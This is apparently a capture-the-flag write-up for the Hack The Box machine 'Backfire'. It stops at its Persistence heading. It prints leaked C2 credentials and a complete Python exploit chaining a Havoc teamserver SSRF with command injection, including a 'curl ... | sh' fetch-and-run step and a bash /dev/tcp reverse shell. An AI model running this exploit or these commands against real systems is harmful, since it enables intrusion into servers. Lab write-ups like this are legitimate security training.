---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Medium
  - Havoc
  - CommandAndControl
  - C2
  - ServerSideRequestForgery
  - SSRF
  - WebSockets
  - CommandInjection
  - RemoteCodeExecution
  - RCE
  - ExploitDevelopment
  - HardHatC2
  - AuthenticationBypass
  - iptables
  - sudo
---

![](images/Backfire.png)

## Table of Contents

- [Summary](#Summary)
- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port 8000/TCP](#Enumeration-of-Port-8000TCP)
- [Foothold](#Foothold)
    - [Havoc](#Havoc)
        - [Server-Side Request Forgery (SSRF)](#Server-Side-Request-Forgery-SSRF)
        - [Remote Code Execution (RCE)](#Remote-Code-Execution-RCE)
        - [Exploit Development](#Exploit-Development)
- [Persistence](#Persistence)
- [user.txt](#usertxt)
- [Enumeration](#Enumeration)
- [Privilege Escalation to sergej](#Privilege-Escalation-to-sergej)
    - [HardHatC2](#HardHatC2)
        - [Authentication Bypass](#Authentication-Bypass)
        - [Remote Code Execution (RCE)](#Remote-Code-Execution-RCE)
- [Persistence](#Persistence)
- [Pivoting](#Pivoting)
- [Privilege Escalation to root](#Privilege-Escalation-to-root)
- [root.txt](#roottxt)


## Summary

The box is build to show the `vulnerabilities` of `Command and Control (C2) Servers`. To get `foothold` on the box it is necessary to `merge` two already available `Proof of Concept (PoC)` exploits for the `Havoc C2 Framework` in order to achieve `Remote Code Execution (RCE)`. The `custom exploit` needs to make use of the `Server-Side Request Forgery (SSRF)` vulnerability of the `Havoc C2 Teamserver` to execute `Command Injection` in the `Service Name` field through `WebSockets`. This leads directly to the `user.txt`. After grabbing the flag to `escalate privileges` to the second user it is necessary to attack the second `C2 Framework` on the box which is `HardHatC2`. The available `PoC` leads to `Authentication Bypass` due to a hard coded `JSON Web Token (JWT)` and the ability to `create new users` on the `C2`. After getting access to the dashboard of `HardHatC2` a simple `reverse shell payload` can be fired through an `implant`. A misconfiguration of `iptables` executed with `sudo` gives the ability to store `SSH public keys` as `comment` in `iptables rules`. Saving the `ruleset` to any file like the `authorized_keys` files makes it so that during the `authentication` using `SSH` the malicious `authorized_keys` file get's parsed properly and grants access as `root` to the box. All what is left is to grab the `root.txt`. Very nice, unique and well crafted box!

## Reconnaissance

### Port Scanning

The box started with some interesting combination of open ports. There were port `22/TCP` as expected but besides that we found port `443/TCP`, port `5000/TCP` and port `8000/TCP` to be open.

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.83.139
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-18 20:03 CET
Nmap scan report for 10.129.83.139
Host is up (0.018s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE    SERVICE  VERSION
22/tcp   open     ssh      OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 7d:6b:ba:b6:25:48:77:ac:3a:a2:ef:ae:f5:1d:98:c4 (ECDSA)
|_  256 be:f3:27:9e:c6:d6:29:27:7b:98:18:91:4e:97:25:99 (ED25519)
443/tcp  open     ssl/http nginx 1.22.1
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=127.0.0.1/organizationName=Cloud Inc/stateOrProvinceName=Illinois/countryName=US
| Subject Alternative Name: IP Address:127.0.0.1
| Not valid before: 2024-06-05T18:01:34
|_Not valid after:  2027-06-05T18:01:34
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.22.1
5000/tcp filtered upnp
8000/tcp open     http     nginx 1.22.1
|_http-title: Index of /
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.22.1
| http-ls: Volume /
| SIZE  TIME               FILENAME
| 1559  17-Dec-2024 11:31  disable_tls.patch
| 875   17-Dec-2024 11:34  havoc.yaotl
|_
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.87 seconds
```

### Enumeration of Port 8000/TCP

After poking on each of the ports we found an `open directory listing` configured on `Nginx` on port `8000/TCP` which contain two files.

- [http://10.129.83.139:8000/](http://10.129.83.139:8000/)

```c
┌──(kali㉿kali)-[~]
└─$ whatweb http://10.129.83.139:8000/
http://10.129.83.139:8000/ [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.22.1], IP[10.129.83.139], Index-Of, Title[Index of /], nginx[1.22.1]
```

![](images/2025-01-18_20-09_8000_website.png)

We downloaded both of them for further investigation.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Backfire/files]
└─$ wget http://10.129.83.139:8000/disable_tls.patch
--2025-01-18 20:11:20--  http://10.129.83.139:8000/disable_tls.patch
Connecting to 10.129.83.139:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1559 (1.5K) [application/octet-stream]
Saving to: ‘disable_tls.patch’

disable_tls.patch                                          100%[========================================================================================================================================>]   1.52K  --.-KB/s    in 0s      

2025-01-18 20:11:20 (132 MB/s) - ‘disable_tls.patch’ saved [1559/1559]
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Backfire/files]
└─$ wget http://10.129.83.139:8000/havoc.yaotl
--2025-01-18 20:10:58--  http://10.129.83.139:8000/havoc.yaotl
Connecting to 10.129.83.139:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 875 [application/octet-stream]
Saving to: ‘havoc.yaotl’

havoc.yaotl                                                100%[========================================================================================================================================>]     875  --.-KB/s    in 0s      

2025-01-18 20:10:58 (121 MB/s) - ‘havoc.yaotl’ saved [875/875]
```

The `disable_tls.patch` file contained some `commits` about a `Havoc C2 teamserver` and the fact that `SSL` got deactivated on it. It also mentioned the start of `websockets`.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Backfire/files]
└─$ cat disable_tls.patch 
Disable TLS for Websocket management port 40056, so I can prove that
sergej is not doing any work
Management port only allows local connections (we use ssh forwarding) so 
this will not compromize our teamserver

diff --git a/client/src/Havoc/Connector.cc b/client/src/Havoc/Connector.cc
index abdf1b5..6be76fb 100644
--- a/client/src/Havoc/Connector.cc
+++ b/client/src/Havoc/Connector.cc
@@ -8,12 +8,11 @@ Connector::Connector( Util::ConnectionInfo* ConnectionInfo )
 {
     Teamserver   = ConnectionInfo;
     Socket       = new QWebSocket();
-    auto Server  = "wss://" + Teamserver->Host + ":" + this->Teamserver->Port + "/havoc/";
+    auto Server  = "ws://" + Teamserver->Host + ":" + this->Teamserver->Port + "/havoc/";
     auto SslConf = Socket->sslConfiguration();
 
     /* ignore annoying SSL errors */
     SslConf.setPeerVerifyMode( QSslSocket::VerifyNone );
-    Socket->setSslConfiguration( SslConf );
     Socket->ignoreSslErrors();
 
     QObject::connect( Socket, &QWebSocket::binaryMessageReceived, this, [&]( const QByteArray& Message )
diff --git a/teamserver/cmd/server/teamserver.go b/teamserver/cmd/server/teamserver.go
index 9d1c21f..59d350d 100644
--- a/teamserver/cmd/server/teamserver.go
+++ b/teamserver/cmd/server/teamserver.go
@@ -151,7 +151,7 @@ func (t *Teamserver) Start() {
                }
 
                // start the teamserver
-               if err = t.Server.Engine.RunTLS(Host+":"+Port, certPath, keyPath); err != nil {
+               if err = t.Server.Engine.Run(Host+":"+Port); err != nil {
                        logger.Error("Failed to start websocket: " + err.Error())
                }
```

The second file was the `havoc.yaotl` which contained details about the `teamserver configuration` as well as some `credentials`.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Backfire/files]
└─$ cat havoc.yaotl 
Teamserver {
    Host = "127.0.0.1"
    Port = 40056

    Build {
        Compiler64 = "data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"
        Compiler86 = "data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }
}

Operators {
    user "ilya" {
        Password = "CobaltStr1keSuckz!"
    }

    user "sergej" {
        Password = "1w4nt2sw1tch2h4rdh4tc2"
    }
}

Demon {
    Sleep = 2
    Jitter = 15

    TrustXForwardedFor = false

    Injection {
        Spawn64 = "C:\\Windows\\System32\\notepad.exe"
        Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
    }
}

Listeners {
    Http {
        Name = "Demon Listener"
        Hosts = [
            "backfire.htb"
        ]
        HostBind = "127.0.0.1" 
        PortBind = 8443
        PortConn = 8443
        HostRotation = "round-robin"
        Secure = true
    }
}
```

| Username | Password               |
| -------- | ---------------------- |
| ilya     | CobaltStr1keSuckz!     |
| sergej   | 1w4nt2sw1tch2h4rdh4tc2 |

Of course we tested the credentials on `SSH` to see if we had a quick `foothold` but that was not the case.

```c
┌──(kali㉿kali)-[~]
└─$ ssh ilya@10.129.83.139
The authenticity of host '10.129.83.139 (10.129.83.139)' can't be established.
ED25519 key fingerprint is SHA256:vKC7A11sFxQLRppUMt01q0d/DPREoskH4Aa42t0Bz9M.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.83.139' (ED25519) to the list of known hosts.
ilya@10.129.83.139: Permission denied (publickey).
```

It also expected a `SSH key` to be used to authenticate.

```c
┌──(kali㉿kali)-[~]
└─$ ssh sergej@10.129.83.139
sergej@10.129.83.139: Permission denied (publickey).
```

## Foothold
### Havoc

For the `foothold` we simply tried to use the `credentials` to `connect` to the `teamserver` but that didn't worked.

#### Server-Side Request Forgery (SSRF)

We started looking for `vulnerabilities` related to `Havoc` and found a `Proof of Concept (PoC)` exploit for `Server-Side Request Forgery (SSRF)` on the `teamserver`.

- [https://github.com/chebuya/Havoc-C2-SSRF-poc](https://github.com/chebuya/Havoc-C2-SSRF-poc)

First of all we fired up the `virtual environment` to install all necessary `dependencies`.

```c
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 -m venv venv
```

```c
┌──(kali㉿kali)-[~/Downloads]
└─$ source venv/bin/activate
```

```c
┌──(venv)─(kali㉿kali)-[~/Downloads/Havoc-C2-SSRF-poc]
└─$ pip3 install pycryptodome
Collecting pycryptodome
  Downloading pycryptodome-3.21.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.4 kB)
Downloading pycryptodome-3.21.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.3 MB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 2.3/2.3 MB 16.7 MB/s eta 0:00:00
Installing collected packages: pycryptodome
Successfully installed pycryptodome-3.21.0
```

Then we cloned the `PoC` and modified what we wanted to test.

```c
┌──(venv)─(kali㉿kali)-[~/Downloads]
└─$ git clone https://github.com/chebuya/Havoc-C2-SSRF-poc.git
Cloning into 'Havoc-C2-SSRF-poc'...
remote: Enumerating objects: 39, done.
remote: Counting objects: 100% (39/39), done.
remote: Compressing objects: 100% (35/35), done.
remote: Total 39 (delta 10), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (39/39), 14.83 KiB | 2.47 MiB/s, done.
Resolving deltas: 100% (10/10), done.
```

```c
<--- SNIP --->
request_data = b"GET / HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n"
<--- SNIP --->
```

And we were able to confirm that the version of `Havoc` was actually vulnerable to `SSRF`.

```c
┌──(venv)─(kali㉿kali)-[~/Downloads/Havoc-C2-SSRF-poc]
└─$ python3 exploit.py -t https://10.129.83.139 -i 10.129.83.139 -p 8000
[***] Trying to register agent...
[***] Success!
[***] Trying to open socket on the teamserver...
[***] Success!
[***] Trying to write to the socket
[***] Success!
[***] Trying to poll teamserver for socket output...
[***] Read socket output successfully!
HTTP/1.1 200 OK
Server: nginx/1.22.1
Date: Sat, 18 Jan 2025 22:15:11 GMT
Content-Type: text/html
Transfer-Encoding: chunked
Connection: close

15d
<html>
<head><title>Index of /</title></head>
<body>
<h1>Index of /</h1><hr><pre><a href="../">../</a>
<a href="disable_tls.patch">disable_tls.patch</a>                                  17-Dec-2024 11:31    1559
<a href="havoc.yaotl">havoc.yaotl</a>                                        17-Dec-2024 11:34     875
</pre><hr></body>
</html>

0
```

Next we tried if we could reach out to our local machine.

```c
<--- SNIP --->
request_data = b"GET /foobar HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n"
<--- SNIP --->
```

We modified the `command` to point to our local machine and got a hit on our web server.

```c
┌──(venv)─(kali㉿kali)-[~/Downloads/Havoc-C2-SSRF-poc]
└─$ python3 exploit.py -t https://10.129.83.139 -i 10.10.14.91 -p 8000
[***] Trying to register agent...
[***] Success!
[***] Trying to open socket on the teamserver...
[***] Success!
[***] Trying to write to the socket
[***] Success!
[***] Trying to poll teamserver for socket output...
[***] Read socket output successfully!
HTTP/1.0 404 File not found
Server: SimpleHTTP/0.6 Python/3.12.8
Date: Sat, 18 Jan 2025 22:18:13 GMT
Connection: close
Content-Type: text/html;charset=utf-8
Content-Length: 335

<!DOCTYPE HTML>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 404</p>
        <p>Message: File not found.</p>
        <p>Error code explanation: 404 - Nothing matches the given URI.</p>
    </body>
</html>
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Backfire/files]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.83.139 - - [18/Jan/2025 23:18:13] code 404, message File not found
10.129.83.139 - - [18/Jan/2025 23:18:13] "GET /foobar HTTP/1.1" 404 -
```

#### Remote Code Execution (RCE)

Since we could not escape the directory on the box nor achieve `Remote Code Execution (RCE)` through the `GET request`, we headed back to research and found another `PoC` but this time for `Authenticated Remote Code Execution`.

- [https://github.com/IncludeSecurity/c2-vulnerabilities/tree/main/havoc_auth_rce](https://github.com/IncludeSecurity/c2-vulnerabilities/tree/main/havoc_auth_rce)

The `PoC` targeted a `Command Injection` vulnerability in the `Service Name` field which made it necessary to communicate through `websockets`.

#### Exploit Development

So based on the `second PoC` we developed an attack plan.

1. Use `SSRF` on the `teamserver` to access internal resources.
2. Communicate using `websockets` with the `teamserver`.
3. Therefore chain both vulnerabilities to achieve `RCE`.

Since the `Nginx` picked up every connection on port `443/TCP` and forwarded it to the `teamserver` we only had to focus on developing the `payload` we send through `websockets`.

During the `exploit development` process we installed `websocket-client` but it is actually not necessary for the following `PoC` to work. We just leave it here for troubleshooting purposes.

```c
┌──(venv)─(kali㉿kali)-[~/Downloads/Havoc-C2-SSRF-poc]
└─$ pip install websocket-client
Collecting websocket-client
  Downloading websocket_client-1.8.0-py3-none-any.whl.metadata (8.0 kB)
Downloading websocket_client-1.8.0-py3-none-any.whl (58 kB)
Installing collected packages: websocket-client
Successfully installed websocket-client-1.8.0
```

Below is the final `exploit` which contained both `PoCs`. The `exploit` utilizes the `SSRF`vulnerability to write a `websocket` and `inject` an `arbitrary command` to the `Service Name` field. In this case we used `curl` to call a `staged payload` on our local machine to execute a `reverse shell` payload and accordingly gain `foothold` on the machine.

```python
# Credit goes to @chebuya & @IncludeSecurity
#
# https://github.com/chebuya/Havoc-C2-SSRF-poc
# https://blog.chebuya.com/posts/server-side-request-forgery-on-havoc-c2/
# https://github.com/IncludeSecurity/c2-vulnerabilities

import os           # Functions for interacting with the operating system
import json         # Used to parse JSON data
import hashlib      # Provides cryptographic functions
import binascii     # Converts between binary and ASCII data used for encoding/decoding hexadecimal values
import random       # Generates random values for IDs or session data
import requests     # Used for HTTP requests to a server
import argparse     # Parses command-line arguments
import urllib3      # Handles HTTP connections
from Crypto.Cipher import AES       # Provides AES encryption
from Crypto.Util import Counter     # Manages counter-mode (CTR) for AES encryption

# Disable SSL warnings
urllib3.disable_warnings()

# Constants and Utility Functions

# Defines the size of the AES key (256 bits = 32 bytes)
key_bytes = 32

# Decrypt function
# Pads the key to 32 bytes if necessary
# Converts the initialization vector (IV) to an integer.
# Creates a counter for AES CTR mode
# Decrypts the ciphertext using the key and the counter
def decrypt(key, iv, ciphertext):
    if len(key) <= key_bytes:
        for _ in range(len(key), key_bytes):
            key += b"0"

    assert len(key) == key_bytes

    iv_int = int(binascii.hexlify(iv), 16)
    ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
    aes = AES.new(key, AES.MODE_CTR, counter=ctr)

    plaintext = aes.decrypt(ciphertext)
    return plaintext

# int_to_bytes function
# Converts an integer to a byte array of specified length and byte order
def int_to_bytes(value, length=4, byteorder="big"):
    return value.to_bytes(length, byteorder)

# encrypt_function
# Similar to decrypt, but encrypts plaintext into ciphertext
def encrypt(key, iv, plaintext):

    if len(key) <= key_bytes:
        for x in range(len(key),key_bytes):
            key = key + b"0"

        assert len(key) == key_bytes

        iv_int = int(binascii.hexlify(iv), 16)
        ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
        aes = AES.new(key, AES.MODE_CTR, counter=ctr)

        ciphertext = aes.encrypt(plaintext)
        return ciphertext

# Agent Registration

# register_agent function
# Builds an agent registration payload
# Includes metadata like hostname, username, domain name, and process information
# Sends the payload as an HTTP POST request to the teamserver
def register_agent(hostname, username, domain_name, internal_ip, process_name, process_id):
    # DEMON_INITIALIZE / 99
    command = b"\x00\x00\x00\x63"
    request_id = b"\x00\x00\x00\x01"
    demon_id = agent_id

    hostname_length = int_to_bytes(len(hostname))
    username_length = int_to_bytes(len(username))
    domain_name_length = int_to_bytes(len(domain_name))
    internal_ip_length = int_to_bytes(len(internal_ip))
    process_name_length = int_to_bytes(len(process_name) - 6)

    data =  b"\xab" * 100

    header_data = command + request_id + AES_Key + AES_IV + demon_id + hostname_length + hostname + username_length + username + domain_name_length + domain_name + internal_ip_length + internal_ip + process_name_length + process_name + process_id + data

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id

    print("[***] Trying to register agent...")
    r = requests.post(teamserver_listener_url, data=agent_header + header_data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to register agent - {r.status_code} {r.text}")

# Socket Operations

# open_socket function
# Constructs and encrypts a payload to open a socket on the server
# Sends an HTTP POST request to initiate the socket connection
def open_socket(socket_id, target_address, target_port):
    # COMMAND_SOCKET / 2540
    command = b"\x00\x00\x09\xec"
    request_id = b"\x00\x00\x00\x02"

    # SOCKET_COMMAND_OPEN / 16
    subcommand = b"\x00\x00\x00\x10"
    sub_request_id = b"\x00\x00\x00\x03"

    local_addr = b"\x22\x22\x22\x22"
    local_port = b"\x33\x33\x33\x33"


    forward_addr = b""
    for octet in target_address.split(".")[::-1]:
        forward_addr += int_to_bytes(int(octet), length=1)

    forward_port = int_to_bytes(target_port)

    package = subcommand+socket_id+local_addr+local_port+forward_addr+forward_port
    package_size = int_to_bytes(len(package) + 4)

    header_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    data = agent_header + header_data


    print("[***] Trying to open socket on the teamserver...")
    r = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to open socket on teamserver - {r.status_code} {r.text}")

# write_socket function
# Encrypts and sends data over an open socket
def write_socket(socket_id, data):
    # COMMAND_SOCKET / 2540
    command = b"\x00\x00\x09\xec"
    request_id = b"\x00\x00\x00\x08"

    # SOCKET_COMMAND_READ / 11
    subcommand = b"\x00\x00\x00\x11"
    sub_request_id = b"\x00\x00\x00\xa1"

    # SOCKET_TYPE_CLIENT / 3
    socket_type = b"\x00\x00\x00\x03"
    success = b"\x00\x00\x00\x01"

    data_length = int_to_bytes(len(data))

    package = subcommand+socket_id+socket_type+success+data_length+data
    package_size = int_to_bytes(len(package) + 4)

    header_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    post_data = agent_header + header_data

    print("[***] Trying to write to the socket")
    r = requests.post(teamserver_listener_url, data=post_data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to write data to the socket - {r.status_code} {r.text}")

# read_socket function
# Sends a request to read data from a socket and decrypts the response
def read_socket(socket_id):
    # COMMAND_GET_JOB / 1
    command = b"\x00\x00\x00\x01"
    request_id = b"\x00\x00\x00\x09"

    header_data = command + request_id

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    data = agent_header + header_data

    print("[***] Trying to poll teamserver for socket output...")
    r = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Read socket output successfully!")
    else:
        print(f"[!!!] Failed to read socket output - {r.status_code} {r.text}")
        return ""

    command_id = int.from_bytes(r.content[0:4], "little")
    request_id = int.from_bytes(r.content[4:8], "little")
    package_size = int.from_bytes(r.content[8:12], "little")
    enc_package = r.content[12:]

    return decrypt(AES_Key, AES_IV, enc_package)[12:]

# WebSocket Handling

# create_websocket_request
def create_websocket_request(host, port):
    request = (
        f"GET /havoc/ HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: 5NUvQyzkv9bpu376gKd2Lg==\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"\r\n"
    ).encode()
    return request

# build_websocket_frame function
def build_websocket_frame(payload, is_text=True, mask_payload=True):
    """
    Builds a WebSocket frame according to RFC 6455.
    
    Args:
        payload (str or bytes): The data to send in the WebSocket frame.
        is_text (bool): Whether the payload is a text frame (True) or binary frame (False).
        mask_payload (bool): Whether to mask the payload (True for client-to-server frames).

    Returns:
        bytes: A properly constructed WebSocket frame.
    """
    if isinstance(payload, str):
        payload_bytes = payload.encode("utf-8")
    elif isinstance(payload, bytes):
        payload_bytes = payload
    else:
        raise TypeError("Payload must be of type str or bytes.")

    frame = bytearray()

    # First byte: FIN + Opcode
    fin = 0b10000000  # FIN bit set to 1 (final fragment)
    opcode = 0x1 if is_text else 0x2  # 0x1 for text, 0x2 for binary
    frame.append(fin | opcode)

    # Payload length and masking
    payload_length = len(payload_bytes)
    if payload_length <= 125:
        frame.append((0b10000000 if mask_payload else 0) | payload_length)
    elif payload_length <= 65535:
        frame.append((0b10000000 if mask_payload else 0) | 126)
        frame.extend(payload_length.to_bytes(2, byteorder="big"))
    else:
        frame.append((0b10000000 if mask_payload else 0) | 127)
        frame.extend(payload_length.to_bytes(8, byteorder="big"))

    # Masking key
    if mask_payload:
        masking_key = os.urandom(4)
        frame.extend(masking_key)

        # Apply masking to payload
        masked_payload = bytearray(
            byte ^ masking_key[i % 4] for i, byte in enumerate(payload_bytes)
        )
        frame.extend(masked_payload)
    else:
        # No masking, append the raw payload
        frame.extend(payload_bytes)

    return bytes(frame)

# Command-Line Argument Parsing

# Parses command-line arguments like target URL, IP, and port
parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help="The listener target in URL format", required=True)
parser.add_argument("-i", "--ip", help="The IP to open the socket with", required=True)
parser.add_argument("-p", "--port", help="The port to open the socket with", required=True)
parser.add_argument("-A", "--user-agent", help="The User-Agent for the spoofed agent", default="Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
parser.add_argument("-H", "--hostname", help="The hostname for the spoofed agent", default="DESKTOP-7F61JT1")
parser.add_argument("-u", "--username", help="The username for the spoofed agent", default="Administrator")
parser.add_argument("-d", "--domain-name", help="The domain name for the spoofed agent", default="ECORP")
parser.add_argument("-n", "--process-name", help="The process name for the spoofed agent", default="msedge.exe")
parser.add_argument("-ip", "--internal-ip", help="The internal ip for the spoofed agent", default="10.1.33.7")

args = parser.parse_args()

# Main Configuration

# Defines global constants and headers
# Initializes AES keys, agent information, and metadata

# 0xDEADBEEF
magic = b"\xde\xad\xbe\xef"
teamserver_listener_url = args.target
headers = {
        "User-Agent": args.user_agent
}
agent_id = int_to_bytes(random.randint(100000, 1000000))
AES_Key = b"\x00" * 32
AES_IV = b"\x00" * 16
hostname = bytes(args.hostname, encoding="utf-8")
username = bytes(args.username, encoding="utf-8")
domain_name = bytes(args.domain_name, encoding="utf-8")
internal_ip = bytes(args.internal_ip, encoding="utf-8")
process_name = args.process_name.encode("utf-16le")
process_id = int_to_bytes(random.randint(1000, 5000))

# Registering and Interacting with the Teamserver

# Registers the agent with the teamserver
# Opens a socket and sends/receives data
# Uses WebSocket frames to communicate
register_agent(hostname, username, domain_name, internal_ip, process_name, process_id)

socket_id = b"\x11\x11\x11\x11"
open_socket(socket_id, args.ip, int(args.port))

# Defintions for WebSocket Communication

HOSTNAME = "127.0.0.1"
PORT = 40056
USER = "sergej"
PASSWORD = "1w4nt2sw1tch2h4rdh4tc2"

# Request WebSocket
# pip install websocket-client
websocket_request = create_websocket_request(HOSTNAME, PORT)
write_socket(socket_id, websocket_request)
response = read_socket(socket_id)

# Defining payloads
# Payload 1
payload = {
    "Body": {
        "Info": {
            "Password": hashlib.sha3_256(PASSWORD.encode()).hexdigest(),
            "User": USER
        },
        "SubEvent": 3
    },
    "Head": {
        "Event": 1,
        "OneTime": "",
        "Time": "18:40:17",
        "User": USER
    }
}

# Convert the payload to JSON format
payload_json = json.dumps(payload, indent=4)  # Added indent for easier debugging

# Build a WebSocket frame for the JSON payload
frame = build_websocket_frame(payload_json)

# Send the WebSocket frame
write_socket(socket_id, frame)

# Read the response from the WebSocket
response = read_socket(socket_id)

# Process or debug the response (if needed)
if response:
    print("[***] Response from WebSocket:")
    print(response)
else:
    print("[!!!] No response received from WebSocket.")

# Payload 2
payload = {
    "Body": {
        "Info": {
            "Headers": "",
            "HostBind": "0.0.0.0",
            "HostHeader": "",
            "HostRotation": "round-robin",
            "Hosts": "0.0.0.0",
            "Name": "abc",
            "PortBind": "443",
            "PortConn": "443",
            "Protocol": "Https",
            "Proxy Enabled": "false",
            "Secure": "true",
            "Status": "online",
            "Uris": "",
            "UserAgent": (
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
            )
        },
        "SubEvent": 1
    },
    "Head": {
        "Event": 2,
        "OneTime": "",
        "Time": "08:39:18",
        "User": USER
    }
}

# Convert the payload to JSON format
payload_json = json.dumps(payload, indent=4)  # Added indent for easier debugging

# Build a WebSocket frame for the JSON payload
frame = build_websocket_frame(payload_json)

# Send the WebSocket frame
write_socket(socket_id, frame)

# Read the response from the WebSocket
response = read_socket(socket_id)

# Process or debug the response (if needed)
if response:
    print("[***] Response from WebSocket:")
    print(response)
else:
    print("[!!!] No response received from WebSocket.")

cmd = "curl http://10.10.14.91/x | sh"
injection = """ \\\\\\\" -mbla; """ + cmd + """ 1>&2 && false #"""

# Payload 3
payload = {
    "Body": {
        "Info": {
            "AgentType": "Demon",
            "Arch": "x64",
            "Config": (
                "{\n"
                "    \"Amsi/Etw Patch\": \"None\",\n"
                "    \"Indirect Syscall\": false,\n"
                "    \"Injection\": {\n"
                "        \"Alloc\": \"Native/Syscall\",\n"
                "        \"Execute\": \"Native/Syscall\",\n"
                "        \"Spawn32\": \"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\",\n"
                "        \"Spawn64\": \"C:\\\\Windows\\\\System32\\\\notepad.exe\"\n"
                "    },\n"
                "    \"Jitter\": \"0\",\n"
                "    \"Proxy Loading\": \"None (LdrLoadDll)\",\n"
                "    \"Service Name\": \"" + injection + "\",\n"
                "    \"Sleep\": \"2\",\n"
                "    \"Sleep Jmp Gadget\": \"None\",\n"
                "    \"Sleep Technique\": \"WaitForSingleObjectEx\",\n"
                "    \"Stack Duplication\": false\n"
                "}"
            ),
            "Format": "Windows Service Exe",
            "Listener": "abc"
        },
        "SubEvent": 2
    },
    "Head": {
        "Event": 5,
        "OneTime": "true",
        "Time": "18:39:04",
        "User": USER
    }
}

# Convert the payload to JSON format
payload_json = json.dumps(payload, indent=4)  # Added indent for easier debugging

# Build a WebSocket frame for the JSON payload
frame = build_websocket_frame(payload_json)

# Send the WebSocket frame
write_socket(socket_id, frame)

# Read the response from the WebSocket
response = read_socket(socket_id)

# Process or debug the response (if needed)
if response:
    print("[***] Response from WebSocket:")
    print(response)
else:
    print("[!!!] No response received from WebSocket.")
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Backfire/serve]
└─$ cat x
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.14.91/9001 0>&1'
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Backfire/serve]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```c
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
```

```c
┌──(venv)─(kali㉿kali)-[~/Downloads]
└─$ python3 exploit.py -t https://10.129.83.139/ -i 127.0.0.1 -p 40056
```

```c
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.91] from (UNKNOWN) [10.129.83.139] 35588
bash: cannot set terminal process group (44568): Inappropriate ioctl for device
bash: no job control in this shell
ilya@backfire:~/Havoc/payloads/Demon$
```

## Persistence

Since our `shell` died quite quickly we added our `SSH keys` to the `authorized_keys` file to have some `persistence` in place.

```c
